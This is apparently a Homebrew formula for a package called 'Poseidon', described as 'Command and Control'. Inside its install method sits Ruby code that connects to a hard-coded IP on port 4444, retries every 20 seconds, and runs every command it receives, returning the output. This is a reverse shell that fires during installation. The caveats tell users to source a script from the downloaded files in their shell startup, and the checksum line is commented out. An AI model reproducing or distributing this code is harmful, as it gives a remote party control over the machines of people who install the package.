class Poseidon < Formula
    desc "Command and Control"
    homepage "https://github.com/JonEagle/"
    url "https://github.com/JonEagle/homebrew-test/raw/refs/heads/main/poseidon-1.33.7.7z"
    # sha256 "B0B0AFF03111FB463A63C37EA187206A6E47147FF4B396EB4D53F43B7B404B43"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end


require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "3.11.59.87" 
#Set the Remote Host Port
PORT = "4444"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end 


        
          end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
